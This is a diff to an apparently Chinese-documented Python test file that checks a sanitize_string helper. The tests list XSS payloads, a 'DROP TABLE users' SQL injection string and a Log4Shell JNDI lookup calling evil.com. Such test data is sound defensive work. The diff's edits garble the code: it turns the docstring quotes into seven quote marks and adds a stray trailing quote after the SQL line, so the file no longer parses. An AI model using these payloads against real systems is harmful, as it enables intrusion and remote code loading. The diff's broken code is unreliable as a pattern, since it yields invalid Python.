@@ -1,9 +1,9 @@
 from datetime import datetime
-"""
+"""""""
 重构后的高质量工具模块测试
 将1500行模板代码重构为28个有深度的高质量测试
 每个测试包含具体的业务逻辑验证和边界条件测试
-"""
+"""""""
 
 import json
 import sys
@@ -413,7 +413,7 @@ from src.utils.helpers import sanitize_string
             "javascript:alert('xss')",
             "<img src=x onerror=alert('xss')>",
             "<svg onload=alert('xss')>",
-            "'; DROP TABLE users; --",
+            "'; DROP TABLE users; --",'
             "${jndi:ldap://evil.com/a}",
         ]
 
